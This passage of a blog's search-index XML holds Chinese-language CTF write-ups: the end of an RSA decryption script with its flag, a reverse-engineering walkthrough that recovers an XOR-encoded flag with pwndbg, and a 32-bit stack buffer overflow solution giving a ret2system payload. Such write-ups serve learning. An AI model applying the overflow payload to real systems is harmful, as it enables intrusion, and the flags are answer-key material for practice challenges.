href="http://www.factordb.com/index.php?id=1100000001344853721" target="_blank" rel="noopener">http://www.factordb.com/index.php?id=1100000001344853721</a></p><p><img src="/images/15964645742488/15964652542398.jpg" alt="-w1892"></p><div class="hljs"><pre><code class="hljs angelscript">p = <span class="hljs-number">366669102002966856876605669837014229419</span>q = <span class="hljs-number">282164587459512124844245113950593348271</span>N = <span class="hljs-number">103461035900816914121390101299049044413950405173712170434161686539878160984549</span>c = <span class="hljs-number">0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</span>e = <span class="hljs-number">65537</span>def ext_euclid(a, b):    old_s,s=<span class="hljs-number">1</span>,<span class="hljs-number">0</span>    old_t,t=<span class="hljs-number">0</span>,<span class="hljs-number">1</span>    old_r,r=a,b    <span class="hljs-keyword">if</span> b == <span class="hljs-number">0</span>:        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, a    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">while</span>(r!=<span class="hljs-number">0</span>):            q=old_r<span class="hljs-comment">//r</span>            old_r,r=r,old_r-q*r            old_s,s=s,old_s-q*s            old_t,t=t,old_t-q*t    <span class="hljs-keyword">return</span> old_s, old_t, old_rol=(p<span class="hljs-number">-1</span>)*(q<span class="hljs-number">-1</span>)d=ext_euclid(ol,e)[<span class="hljs-number">1</span>]<span class="hljs-keyword">while</span> d&lt;<span class="hljs-number">0</span>:    d+=olm = pow(c, d, N)print(bytes.fromhex(hex(m)[<span class="hljs-number">2</span>:]))</code></pre></div><p>flag:suctf{Pwn_@_hundred_years}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界   BABYRE</title>
    <link href="/2020/07/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%20%20%20BABYRE/"/>
    <url>/2020/07/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%20%20%20BABYRE/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>#攻防世界   BABYRE<br>拿到题目首先checksec</p><p>然后开始用ida进行逆向分析:<br>对main函数进行分析:<br><img src="/images/15955744706054/15955751479238.jpg" alt="-w730"></p><p>从图中15行可以很明显知道flag的长度应该为14，难点在于judge函数的判断，已知s是输入的字符串，然而ida没法对judge函数进行反汇编，所以下面用pwndbg来调试出隐藏加密的flag<br><img src="/images/15955744706054/15955753082155.jpg" alt="-w995"></p><p>对scanf函数进行断点，断点位置是0x400660<br><img src="/images/15955744706054/15955756377003.jpg" alt="-w921"><br>然后next,我们先输入一个长度为14的字符串用来绕过长度判断即可<br><img src="/images/15955744706054/15955757875062.jpg" alt="-w890"></p><p>然后继续next<br><img src="/images/15955744706054/15955759272460.jpg" alt="-w610"></p><p>发现0x400686地址那有个call函数，估计就是judge函数了，注意:目前cs:ip指向的mov edx, 0x600b00就要call的地址了，这里半天没发现，edx和rdx很容易看成两个不同的寄存器，接下来对0x600b00断点,s走进judge函数<br><img src="/images/15955744706054/15955762484002.jpg" alt="-w675"></p><p>来到judge函数里头后，继续s单步调试<br><img src="/images/15955744706054/15955763352349.jpg" alt="-w665"></p><p>严重怀疑从0x600b08开始的字符串就是flag，但也不要大意，可能有加密处理，注意观察!<br>‘0x66’, ‘0x6d’, ‘0x63’, ‘0x64’, ‘0x7f’, ‘0x6b’, ‘0x37’, ‘0x64’, ‘0x3b’, ‘0x56’, ‘0x60’, ‘0x3b’, ‘0x6e’, ‘0x70’,</p><p><img src="/images/15955744706054/15955766846872.jpg" alt="-w680"><br>单步调试的过程中我们发现有一个可疑的操作:在0x600b69处 xor edx, ecx,<br>而edx对应rdx里的’a’， ecx对应rcx里的0x0,继续s看看有没有啥规律</p><p>‘b’^1<br><img src="/images/15955744706054/15955769254539.jpg" alt="-w659"></p><p>‘c’^2<br><img src="/images/15955744706054/15955769808498.jpg" alt="-w742"></p><p>‘d’^3<br><img src="/images/15955744706054/15955770495085.jpg" alt="-w685"></p><p>将judge函数执行完后，发现我们的abcdefghijklmn变成了acagacaoacagac<br><img src="/images/15955744706054/15955772304111.jpg" alt="-w600"></p><p><img src="/images/15955744706054/15955772816809.jpg" alt="-w824"></p><p>猜测flag[i] = str[i]^i,对输入的字符串处理后最后test与正确的flag判断，对就是right了<br>最后用python脚本得出flag:<br><img src="/images/15955744706054/15955782875809.jpg" alt="-w966"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界 PWN level2</title>
    <link href="/2020/07/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%20PWN%20level2/"/>
    <url>/2020/07/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%20PWN%20level2/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>#攻防世界 PWN level2<br>检测出是32位没加壳的，用32位ida逆之<br><img src="/images/15952797329939/15956013879942.jpg" alt="-w548"></p><p>反汇编后函数的主要流程，从图中可以看出vulnerable_function是关键,进入看看<br><img src="/images/15952797329939/15956022348125.jpg" alt="-w892"></p><p>不难发现,程序给字符串分配的栈空间只有88h, F5翻译成C语言看看<br><img src="/images/15952797329939/15956023620451.jpg" alt="-w907"></p><p>从read函数可以发现，函数分配了0x100的栈空间，但是输入的字符串实际上只分配了88h，因此，多余的栈空间就溢出了<br><img src="/images/15952797329939/15956024223284.jpg" alt="-w451"></p><p>利用多余的栈空间写入system函数的地址和flag函数的地址<br>  <img src="/images/15952797329939/15961775242574.jpg" alt="-w324"></p><p>找到flag的位置<br><img src="/images/15952797329939/15961815548756.jpg" alt="-w668"><br><img src="/images/15952797329939/15961815778542.jpg" alt="-w562"></p><p>payload = ‘a’<em>0x88 + ‘b’</em>4 + p32(system) + p32(0) + p32(binaddr)</p><p>‘b’*4用来覆盖ebp，system是系统函数地址，p32(0)用来覆盖调用binaddr前返回地址，然后当前保存的ebp就是binaddr，binaddr下面的各个参数就包含有flag了<br><img src="/images/15952797329939/15961816913455.jpg" alt="-w647"></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
